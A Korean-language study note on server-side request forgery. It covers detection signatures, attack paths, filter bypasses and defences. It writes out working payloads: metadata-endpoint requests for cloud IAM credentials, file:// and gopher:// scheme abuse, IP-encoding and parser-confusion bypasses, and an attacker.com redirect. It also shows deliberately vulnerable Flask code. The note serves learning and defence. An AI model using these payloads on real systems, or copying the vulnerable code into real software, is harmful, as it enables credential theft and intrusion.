---
title: SSRF Overview
draft: false
tags:
  - SSRF
ShowToc: true
date: 2026-06-20
---

## 1. 결함의 본질
서버가 외부 입력을 받아 다른 곳으로 HTTP 요청을 보낼 때 그 요청의 목적지나 내용을 공격자가 조작할 수 있는 결함
요청을 보내는 주체가 서버라서 서버 권한으로 외부에서 못 닿는 자원에 접근 가능 (내부망, localhost, 클라우드 메타데이터 169.254.169.254)

- CSRF와의 차이: 피해자 브라우저가 아니라 서버가, 서버 권한으로 요청을 전송

## 2. 공격 대상
외부에서 직접 못 닿지만 서버는 닿는 자원, 서버를 경유해 내부 공격
- 내부 API, 내부 DB
- localhost에 뜬 관리 포트, 관리자 패널
- 클라우드 메타데이터 엔드포인트

## 3. 전제 조건
- 서버가 외부 입력을 받아 다른 곳으로 요청 전송 (프록시, 중계, URL fetch, 웹훅, 이미지 미리보기)
- 그 요청의 목적지(URL)나 내용(바디, 파라미터)에 입력이 반영
- 목적지나 내용에 대한 검증이 없거나 부실

## 4. 탐지
### 코드 시그니처
사용자 입력이 서버 측 HTTP 클라이언트로 흘러드는 지점

```python
# Python
requests.get(user_url)
urllib.request.urlopen(user_url)
subprocess.run(["curl", user_target])   # 셸 없어도 성립
```
```javascript
fetch(userUrl); axios.get(userUrl); http.get(userUrl)   // Node
```
```php
file_get_contents($url); curl_exec($ch)                 // PHP
```

### 기능 이름
preview, import from URL, webhook, proxy, thumbnail, avatar from URL, PDF/screenshot from URL, health check, RSS/feed reader
URL을 받아 무언가 가져오는 기능은 우선 확인 대상

### 판별 질문
- 서버가 입력을 받아 또 다른 요청을 보내는가
- 그 요청의 목적지나 바디를 입력이 건드리는가
- 목적지형이면 내부 주소(localhost, 169.254.169.254, 사설 IP)로 돌릴 수 있는가
- 바디형이면 서버가 고정한 값을 파라미터 중복이나 인젝션으로 덮을 수 있는가

## 5. 공격 경로
입력이 요청의 어디에 반영되느냐로 갈림

### 목적지(URL) 조작
서버가 fetch(입력_URL) 하면 내부 주소를 넣어 응답을 받아냄
```
http://127.0.0.1:PORT/            # localhost 내부 서비스
http://internal-svc:8080/         # 내부 서비스명
http://169.254.169.254/latest/meta-data/   # AWS 메타데이터
http://metadata.google.internal/            # GCP
```
스킴 남용 (curl 등 다중 스킴 클라이언트)
```
file:///etc/passwd                # 로컬 파일 읽기
gopher://127.0.0.1:6379/_...      # 임의 TCP, Redis/SMTP 명령 주입
dict://127.0.0.1:11211/           # memcached
```

### 내용(바디) 조작
목적지는 고정, 바디에 입력 반영 → 서버가 고정했다 믿는 값을 덮어씀
HPP(HTTP Parameter Pollution) 예시
```python
data = f"title={title}&body={body}&user=guest"   # 문자열 조립
```
body에 &user=admin 주입 → title=...&body=내용&user=admin&user=guest
→ user 파라미터 중복, Flask는 첫 번째 채택 → guest로 고정한 권한이 admin으로 상승

## 6. 필터 우회
allowlist/blocklist가 걸린 경우

### IP 표현 바꾸기 (127.0.0.1)
```
http://2130706433/       # 10진
http://0x7f000001/       # 16진
http://0177.0.0.1/       # 8진
http://[::1]/  http://[::ffff:127.0.0.1]/   # IPv6, IPv4-mapped
http://0/                # 0.0.0.0
```

### 파서 차이 (검증 파서 ≠ fetch 파서)
```
http://allowed.com@127.0.0.1/    # @ 앞은 userinfo, 실제 host는 뒤쪽
http://127.0.0.1#allowed.com     # # 뒤는 fragment
http://allowed.com.attacker.com/ # 접두/접미 매칭 허점
```

### 리다이렉트
allowlist는 최초 URL만 검사, 서버가 리다이렉트를 따라감
```
공격자 서버가 302 Location: http://169.254.169.254/ 반환 → 서버가 재요청
코드에 allow_redirects=True 있으면 열리는 통로
```

### DNS 리바인딩
검증 시점엔 공인 IP, fetch 시점엔 내부 IP로 DNS 응답 교체

## 7. Blind SSRF
요청은 나가지만 응답이 안 돌아오는 경우
- 탐지: OOB, webhook.site나 Burp Collaborator로 서버가 내 URL을 부르는지 확인
- 활용: 내부 포트 스캔(응답 시간/에러 차이로 열림 판별), 다른 채널로 새는 메타데이터 자격증명 탈취

## 8. 이후 확장
SSRF 자체가 끝이 아니라 다음 단계로 가는 경유인 경우 많음
```
SSRF → file://           로컬 파일 읽기 (설정, 비밀, 키)
SSRF → 169.254.169.254   클라우드 IAM 자격증명 → 계정 장악
SSRF → gopher://         내부 Redis/DB 명령 주입 → RCE
SSRF → 내부 관리자 API    인증 없는 내부 엔드포인트 직접 호출
```

## 9. 코드 예시
### (a) 목적지형, 검증 전무
```python
@app.get("/fetch")
def fetch():
    url = request.args.get("url")     # 검증 없음
    return requests.get(url).text     # 서버가 임의 URL fetch
```
```
# 공격
/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### (b) 스킴 미검증
```python
target = request.args.get("url")
subprocess.run(["curl", target])      # curl에 임의 스킴 허용
```
```
# 공격
?url=file:///flag                     # curl이 로컬 파일을 읽어 출력
```

### (c) 부실한 allowlist + 리다이렉트
```python
if not url.startswith("https://api.trusted.com"):   # 접두사만 검사
    abort(400)
requests.get(url, allow_redirects=True)             # 리다이렉트 추종
```
```
# 공격
https://api.trusted.com@attacker.com/
# 또는 공격자 서버가 302 → http://localhost:내부포트
```

### (d) 이중 SSRF, 방어 비대칭
공개면은 스킴을 http/https로 제한, 내부면은 스킴 검증 없음
```
공개 app: url은 http/https만 허용 → 직접 file:// 불가
          대신 http://internal:port/... 로 내부 서비스에 도달 (1단)
내부 svc: 스킴 미검증 curl → ?url=file:///flag 로 파일 읽기 (2단)
```
공개면과 내부면의 검증 비대칭이 다단 체인을 강제

## 10. 방어
- 목적지 검증: allowlist로 정해진 목적지만 접근, 입력 URL을 사용자가 못 정하게
- 스킴 제한: http/https만 허용, file/gopher/dict 차단
- 리다이렉트 차단, 또는 리다이렉트 후 목적지 재검증
- 입력 분리/인코딩: 바디 조립 시 입력을 URL 인코딩해 &, = 구분자 주입 차단
- 내부망 분리: 내부 API가 외부 요청을 그대로 신뢰하지 않게 인증/네트워크 분리
- 고정값 분리: user처럼 서버가 정하는 값은 입력과 같은 문자열로 조립하지 않기
- 메타데이터 보호: IMDSv2처럼 토큰 요구 방식으로 메타데이터 접근 차단